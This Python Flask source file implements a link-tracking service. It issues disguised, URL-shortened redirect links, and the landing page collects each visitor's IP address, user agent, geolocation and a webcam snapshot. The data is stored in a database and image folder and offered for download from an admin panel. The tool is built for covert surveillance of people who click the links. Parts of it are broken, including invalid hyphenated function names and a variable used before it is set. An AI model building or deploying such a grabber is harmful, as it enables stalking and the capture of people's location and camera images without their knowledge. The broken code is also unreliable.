from flask import Flask, render_template, request, redirect, url_for, jsonify, send_file, flash, session
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from werkzeug.security import generate_password_hash, check_password_hash
import time
import uuid
import os
import base64
import sqlite3
import requests
import tempfile



app = Flask(__name__)

app.secret_key = os.urandom(24)  # Generates a random 24-byte key

# Initialize Flask-Login
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

DATABASE = 'data.db'
redirects = {}
collected_data = {}

# Initialize SQLite database
def init_db():
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS collected_data (
                            id TEXT PRIMARY KEY,
                            ip_address TEXT,
                            user_agent TEXT,
                            location TEXT,
                            email TEXT,
                            webcam_image_path TEXT
                        )''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            username TEXT UNIQUE,
                            password TEXT
                        )''')
        conn.commit()

init_db()

class User(UserMixin):
    def __init__(self, id, username, password):
        self.id = id
        self.username = username
        self.password = password

@login_manager.user_loader
def load_user(user_id):
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))
        user = cursor.fetchone()
        if user:
            return User(id=user[0], username=user[1], password=user[2])
    return None
    
    
    
    
    




@app.route('/')
def home():
    return render_template('index.html', data=get_all_collected_data())



@app.route('/create', methods=['POST'])
def create():
    target_url = request.form.get('url')
    delay = int(request.form.get('delay', 0))
    email = request.form.get('email')
    
    if not email:
        return jsonify({'error': 'Email is Required'}), 400

    if not is_valid_url(target_url):
        return jsonify({'error': 'Invalid URL'}), 400

    redirect_id = str(uuid.uuid4())
    redirects[redirect_id] = {'target_url': target_url, 'delay': delay, 'email': email}
    session['email'] = email
    
    redirect_url = url_for('redirect_handler', redirect_id=redirect_id, _external=True)
    
    # Shorten the URL using the external API
    short_url = shorten_url(redirect_url)
    
    if not short_url:
        short_url = redirect_url  # Fall back to the original URL
    
    return jsonify({
        'original_url': redirect_url,
        'shortened_url': short_url
    })

@app.route('/redirect/<redirect_id>')
def redirect_handler(redirect_id):
    redirect_info = redirects.get(redirect_id)
    if redirect_info:
        target_url = redirect_info['target_url']
        delay = redirect_info['delay']
        time.sleep(delay)
        
        # Generate a page to collect data
        return render_template('data_collection.html', target_url=target_url)
    else:
        return "Invalid redirect ID", 404

@app.route('/collect_data', methods=['POST'])
def collect_data():
    ip_address = request.form.get('ip', 'Unknown')
    user_agent = request.form.get('user_agent', 'Unknown')
    location = request.form.get('location', 'Location not available')
    webcam_image_data = request.form.get('webcam_image_data')
    target_url = request.form.get('target_url')
    email = session.pop('email', 'Unknown')

    image_path = 'None'
    if webcam_image_data:
        header, encoded = webcam_image_data.split(',', 1)
        image_data = base64.b64decode(encoded)
        image_path = f'/webcam_images/{uuid.uuid4()}.png'  # Start path with '/'
        full_image_path = os.path.join('static', image_path.lstrip('/'))
        os.makedirs(os.path.dirname(full_image_path), exist_ok=True)
        with open(full_image_path, 'wb') as f:
            f.write(image_data)
    collected_data[uuid.uuid4().hex] = {
        'ip_address': ip_address,
        'user_agent': user_agent,
        'location': location,
        'webcam_image_path': full_image_path
    }
    
    # Fetch email from redirects dictionary

    save_data(ip_address, user_agent, location, email, image_path)

    # Log the collected data
    log_info(ip_address, user_agent, image_path if webcam_image_data else 'None', location)
    
    # Remove the image file if it was saved
    
    # Redirect to the target URL
    return redirect(request.form.get('target_url', '/'))

@app.route('/download_data_to_usr')
def download_data_to_usr():
    
    with tempfile.NamedTemporaryFile(delete=False, suffix='.txt') as temp_file:
        for key, data in collected_data.items():
            temp_file.write(f'ID: {key}\n'.encode())
            temp_file.write(f'IP Address: {data["ip_address"]}\n'.encode())
            temp_file.write(f'User Agent: {data["user_agent"]}\n'.encode())
            temp_file.write(f'Webcam Image Path: {data["webcam_image_path"]}\n'.encode())
            temp_file.write(b'-' * 40 + b'\n')

        temp_file_path = temp_file.name

    try:
        return send_file(temp_file_path, as_attachment=True)
    finally:
        os.remove(temp_file_path)

@app.route('/admin', methods=['GET', 'POST'])
@login_required
def admin_panel():
    if request.method == 'POST':
        if 'clear_data' in request.form:
            clear_data()
            flash('Data and images cleared!', 'success')
        elif 'download_data' in request.form:
            return redirect(url_for('download_data'))
    
    data = get_all_collected_data()
    return render_template('admin_panel.html', data=data)

@app.route('/download_data')
@login_required
def download_data():
    file_path = 'DATABASE.txt'
    with open(file_path, 'w') as f:
        for key, data in get_all_collected_data().items():
            f.write(f'ID: {key}\n')
            f.write(f'IP Address: {data["ip_address"]}\n')
            f.write(f'User Agent: {data["user_agent"]}\n')
            f.write(f'Webcam Image Path: {data["webcam_image_path"]}\n')
            f.write(f'Email: {data["email"]}\n')
            f.write('-' * 40 + '\n')
    return send_file(file_path, as_attachment=True)

@app.route('/download_image/<image_name>')
def download_image(image_name):
    file_path = os.path.join('static/webcam_images', image_name)
    if os.path.isfile(file_path):
        return send_file(file_path, as_attachment=True)
    else:
        return "Image not found", 404

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        with sqlite3.connect(DATABASE) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM users WHERE username = ?', (username,))
            user = cursor.fetchone()

        if user and check_password_hash(user[2], password):
            login_user(User(id=user[0], username=user[1], password=user[2]))
            return redirect(url_for('admin_panel'))
        else:
            flash('Invalid credentials', 'danger')

    return render_template('login.html')

@app.route('/privacy-policy')
def privacy-policy():
    return render_template('privacy-policy.html')
    
@app.route('/terms-of-service')
def terms-of-service():
    return render_template('terms-of-service.html')


@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

def save_data(ip_address, user_agent, location, email, webcam_image_path):
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        data_id = uuid.uuid4().hex
        cursor.execute('''INSERT INTO collected_data (id, ip_address, user_agent, location, email, webcam_image_path)
                          VALUES (?, ?, ?, ?, ?, ?)''', 
                          (data_id, ip_address, user_agent, location, email, webcam_image_path))
        conn.commit()

def get_all_collected_data():
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM collected_data')
        rows = cursor.fetchall()
        data = {}
        for row in rows:
            data[row[0]] = {
                'ip_address': row[1],
                'user_agent': row[2],
                'location': row[3],
                'email': row[4],
                'webcam_image_path': row[5]
            }
        return data

def log_info(ip_address, user_agent, webcam_image_path, location):
    with open('redirect_log.txt', 'a') as f:
        f.write(f'IP Address: {ip_address}\n')
        f.write(f'User Agent: {user_agent}\n')
        f.write(f'Webcam Image Path: {webcam_image_path}\n')
        f.write(f'Location: {location}\n')
        f.write('-' * 40 + '\n')

def is_valid_url(url):
    try:
        response = requests.head(url, allow_redirects=True)
        return response.status_code == 200
    except requests.RequestException:
        return False

def clear_data():
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('DELETE FROM collected_data')
        conn.commit()

    # Delete all images
    for root, dirs, files in os.walk('static/webcam_images'):
        for file in files:
            os.remove(os.path.join(root, file))
            
            
def clear_txt_data():
    for root, dirs, files in os.walk('data'):
        for file in files:
            os.remove(os.path.join(root, file))
    
    
            
def create_default_user():
    default_username = os.getenv('usr')
    default_password = os.getenv('pass')  # Change this to your desired password
    hashed_password = generate_password_hash(default_password)

    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE username = ?', (default_username,))
        user = cursor.fetchone()
        if not user:
            cursor.execute('INSERT INTO users (username, password) VALUES (?, ?)', (default_username, hashed_password))
            conn.commit()
            
            
            



def shorten_url(long_url):
    # Data to send in the POST request
    data = {'longUrl': long_url}
    
    api_url = 'http://miniurli.onrender.com/api/shorten'
    
    try:
        response = requests.post(api_url, json=data)
        
        response.raise_for_status()
        
        # Get the JSON response
        result = response.json()
        
        # Extract the shortened URL
        short_url = result.get('shortUrl')
        
        if short_url:
            return short_url
        else:
            raise ValueError("Short URL not found in response")
    
    except requests.RequestException as e:
        # Handle request-related errors
        print(f"Failed to shorten URL: {e}")
        return None
    except ValueError as e:
        # Handle value errors
        print(e)
        return None



if __name__ == '__main__':
    init_db()
    create_default_user()
    app.run(host="0.0.0.0", port=8000, debug=True, use_reloader=False)  # 